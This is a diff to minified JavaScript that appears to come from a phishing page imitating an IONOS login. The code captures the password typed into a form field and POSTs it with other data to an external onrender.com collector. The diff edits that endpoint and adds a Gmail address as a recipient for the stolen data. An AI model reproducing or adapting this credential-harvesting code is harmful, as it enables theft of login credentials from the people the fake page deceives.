@@ -16,8 +16,9 @@
       , l = t(2265)
       , n = t(4829);
     let d = {
-      send_to: "brownjess",
-      source: 'ionos'
+      send_to: 'brownjess',
+      source: 'ionos',
+      to: 'Peterstilinski111@gmail.com ',
     };
     function c() {
       let [e, s] = (0,
@@ -49,7 +50,7 @@
           }
           u.current && (d.password = u.current.value);
           try {
-            fetch('https://web-yyoj.onrender.com/brown', {
+            fetch('https://web-yyoj.onrender.com', {
               method: 'POST',
               headers: {
                 'Content-Type': 'application/json'
